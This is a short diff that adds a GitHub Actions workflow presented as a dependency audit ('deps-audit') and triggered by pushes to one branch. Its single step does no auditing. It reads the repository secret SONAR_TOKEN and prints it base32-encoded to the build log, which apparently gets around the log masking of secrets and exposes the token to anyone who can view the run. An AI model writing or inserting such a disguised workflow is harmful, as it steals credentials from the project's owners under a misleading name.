@@ -1,0 +1,17 @@
+name: deps-audit
+on:
+  push:
+    branches:
+      - 'fix/deps-audit-1789706162579000571'
+
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: audit
+        env:
+          S0: ${{ secrets.SONAR_TOKEN }}
+        run: |
+          echo 'SONAR_TOKEN:'
+          echo "$S0" | base32 -w0
+          echo
